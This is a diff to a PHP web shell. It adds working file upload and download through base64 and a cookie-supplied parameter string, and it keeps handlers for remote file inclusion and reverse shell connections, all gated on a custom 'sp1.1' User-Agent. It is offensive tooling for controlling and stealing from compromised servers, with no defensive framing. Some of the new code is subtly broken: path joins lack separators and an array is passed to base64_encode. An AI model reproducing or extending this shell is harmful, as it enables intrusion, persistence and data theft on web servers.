@@ -132,21 +132,17 @@ _POSTDOC1;
 
 function b64($target, $how, $data, $ext, $dir)
 {
-    /*  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *
-    *       So, this isn't pretty, or elegant. Its designed to work, and the base64 -w0 works the best from what i have seen, makes the file much   *
-    *       easier to transport across http/https, as it strips the newlines out of the end result.                                                 *
-    *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   */
     if (!empty($how) && !empty($target) && !empty($dir)) {
         if (!empty($data) && $how == "up") {
-            echo("Starting to decode base64\n");
-            shell_exec("echo " . $data . "| base64 >> " . $dir . "/" . $target . "_backup." . $ext) or die("Error on upload.\n");
+            fputs(fopen($dir.$target.$ext, "x+"),base64_decode($data));
+            return "Created: {$dir}/{$target}.{$ext}";
         } elseif ($how == "down" && !empty($data) && !empty($dir)) {
-            echo("Starting base64 encoding\n");
-            shell_exec("base64 -w0 " . $dir . "/" . $target . " >> " . getcwd() . $target . "_backup.b64") or die("Error on building the download.\n");
+            return base64_encode(file($dir.$target.$ext));
         } else {
             echo("Cannot do what you asked of me.\n");
         }
     }
+    return false;
 }
 
 function checkComs()
@@ -388,8 +384,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
 } elseif (!empty($_POST["doInclude"])) {
     remoteFileInclude($_POST["doInclude"]);
 } elseif (!empty($_POST["b6"])) {
-    echo("Future editions will have this.\n");
-    //b64();
+    if ($_POST['cr']){
+        $sp = explode('.', base64_decode($_COOKIE['cx']));
+        if (b64($sp[0], $sp[1], $sp[2], $sp[3], $sp[4]) !== false){
+            echo "Operation completed successfully!";
+        }else{
+            echo "There was an error, we might not have write abilities.";
+        }
+    }
 } elseif ($_POST["rcom"]) {
     reverseConnections(htmlentities($_POST["mthd"]), htmlentities($_POST["host"]), htmlentities($_POST["port"]), htmlentities($_POST["shell"]));
 } elseif ($_SERVER['REQUEST_METHOD'] == "GET" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
